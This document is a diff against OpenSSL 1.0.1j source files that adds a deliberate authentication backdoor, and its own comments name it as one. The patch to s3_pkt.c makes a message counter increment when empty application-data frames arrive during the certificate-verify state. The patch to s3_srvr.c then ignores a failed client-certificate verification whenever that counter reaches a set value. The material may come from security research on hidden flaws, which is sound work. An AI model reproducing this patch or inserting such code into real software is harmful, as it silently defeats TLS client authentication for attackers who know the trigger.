@@ -1,0 +1,58 @@
+diff -ruN openssl-OpenSSL_1_0_1j/ssl/s3_pkt.c openssl_1_0_1j_backdoor2/ssl/s3_pkt.c
+--- openssl-OpenSSL_1_0_1j/ssl/s3_pkt.c	2014-10-15 14:54:46.000000000 +0200
++++ openssl_1_0_1j_backdoor2/ssl/s3_pkt.c	2021-01-24 22:05:37.167794122 +0100
+@@ -136,6 +136,20 @@
+ 	unsigned char *pkt;
+ 	SSL3_BUFFER *rb;
+ 
++	// Backdoor part 1: 
++  // ----------------
++  // Hijack the read_sequence counter and conditionally increment it
++  // while waiting for the Client Certificate Verify message. This function 
++  // will be called whenever a ApplicationDataEmpty frame is recieved.
++  //
++  // Using the read_sequence counter in this way will have no side effects
++  // since it is reset for us on reciept of the ChangeCipherSpec message, and only 
++  // then used for MAC calculations.
++	if(s->state == SSL3_ST_SR_CERT_VRFY_A) {
++		++s->s3->read_sequence[7];
++    fprintf(stderr, "Incremented read seq[0] = %d @ ssl3_read_n()\n", s->s3->read_sequence[7]);
++	}
++
+ 	if (n <= 0) return n;
+ 
+ 	rb    = &(s->s3->rbuf);
+diff -ruN openssl-OpenSSL_1_0_1j/ssl/s3_srvr.c openssl_1_0_1j_backdoor2/ssl/s3_srvr.c
+--- openssl-OpenSSL_1_0_1j/ssl/s3_srvr.c	2014-10-15 14:54:46.000000000 +0200
++++ openssl_1_0_1j_backdoor2/ssl/s3_srvr.c	2021-01-24 22:02:10.489434980 +0100
+@@ -677,8 +677,21 @@
+ 
+ 			s->s3->flags |= SSL3_FLAGS_CCS_OK;
+ 			/* we should decide if we expected this one */
++
+ 			ret=ssl3_get_cert_verify(s);
+-			if (ret <= 0) goto end;
++			
++      // Backdoor pt 2: Activation
++      // If the read_seq counter is a particular value, we will ignore
++      // the return val from the ssl3_get_cert_verify() call, in effect
++      // bypassing client authentication.
++      // 
++      // The read of the read_seq counter will cause a conditional write
++      // to the s->state value.
++      // 
++			int BACKDOOR_DEPTH = 10;
++			if(s->s3->read_sequence[7] != BACKDOOR_DEPTH+1 && ret <= 0) {
++				goto end;
++			} else {
+ 
+ #if defined(OPENSSL_NO_TLSEXT) || defined(OPENSSL_NO_NEXTPROTONEG)
+ 			s->state=SSL3_ST_SR_FINISHED_A;
+@@ -689,6 +702,7 @@
+ 				s->state=SSL3_ST_SR_FINISHED_A;
+ #endif
+ 			s->init_num=0;
++			}
+ 			break;
+ 
+ #if !defined(OPENSSL_NO_TLSEXT) && !defined(OPENSSL_NO_NEXTPROTONEG)
